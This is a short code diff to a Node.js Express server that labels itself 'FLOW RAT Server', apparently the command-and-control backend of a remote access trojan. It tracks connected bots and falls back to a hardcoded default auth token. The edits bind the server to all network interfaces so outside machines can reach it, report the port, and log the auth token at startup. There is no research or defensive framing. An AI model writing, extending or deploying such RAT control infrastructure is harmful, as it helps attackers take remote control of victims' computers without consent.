@@ -8,6 +8,7 @@ app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 
 const PORT = process.env.PORT || 3000;
+const HOST = '0.0.0.0';
 const AUTH_TOKEN = process.env.AUTH_TOKEN || 'flow-secret-token-2026';
 
 // ====== STORAGE (in-memory) ======
@@ -28,7 +29,8 @@ app.get('/', (req, res) => {
         status: 'FLOW RAT Server Running',
         time: new Date().toISOString(),
         bots_total: Object.keys(bots).length,
-        version: '1.0.0'
+        version: '1.0.0',
+        port: PORT
     });
 });
 
@@ -138,7 +140,9 @@ app.use((req, res) => {
     res.status(404).json({ error: 'not found', path: req.path });
 });
 
-app.listen(PORT, () => {
-    console.log(`[FLOW RAT] Server running on port ${PORT}`);
+// ====== START ======
+app.listen(PORT, HOST, () => {
+    console.log(`[FLOW RAT] Server running on http://${HOST}:${PORT}`);
     console.log(`[FLOW RAT] Auth token: ${AUTH_TOKEN}`);
+    console.log(`[FLOW RAT] Ready to accept connections`);
 });
